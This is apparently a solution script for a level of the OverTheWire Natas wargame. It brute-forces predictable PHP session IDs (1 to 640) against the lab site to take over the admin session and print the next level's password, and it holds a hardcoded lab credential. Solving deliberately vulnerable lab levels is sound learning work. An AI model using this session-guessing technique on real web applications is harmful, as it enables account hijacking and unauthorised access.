#!/usr/bin/python
import requests
username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
def get_flag():
    obj = {'username' : 'admin', 'password':''}
    url = 'http://' + username + '.natas.labs.overthewire.org/'
    print('Brute-forcing cookies..................')
    # a random number is set from 1 to 640 for the PHPSESSID cookie
    # each time a user logs in. We can login with every possible
    # cookie until we guess the admin cookie. Looking from source
    # we know username is admin
    # function createID($user) { /* {{{ */
    #     global $maxid = 640;
    #     return rand(1, $maxid);
    # }
    for i in range(1, 641):
        print(i)
        session = requests.Session()
        cookies = { 'PHPSESSID' : str(i) }
        response = session.post(url, data = obj, cookies=cookies, auth = (username, password))
        index = response.text.find('<div id="content">')
        if('You are logged in as a regular user' not in response.text[index:]):
            r = response.text[index:]
            index = r.find('Password: ')
            index2 = r.find('</pre>')
            print('Username: natas19')
            print(r[index:index2])
            break
get_flag()
